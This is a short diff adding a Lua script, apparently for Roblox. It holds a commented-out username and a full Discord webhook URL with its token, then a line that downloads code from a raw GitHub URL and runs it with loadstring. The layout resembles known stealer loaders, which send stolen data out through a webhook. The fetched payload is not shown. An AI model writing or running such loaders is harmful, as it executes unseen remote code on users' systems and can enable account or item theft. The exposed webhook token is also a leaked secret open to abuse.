@@ -1,0 +1,4 @@
+--UserName = "HenryUnexpected"
+--Webhooks = "https://discord.com/api/webhooks/1070135730011115520/qEvj6fJ7XlBBjXR3mWase7JweWaeo4u2Xie5ioexbyMbponagsdmepPejfFeEkdVirfO"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsBlox/Script/main/Main-Lua"))()
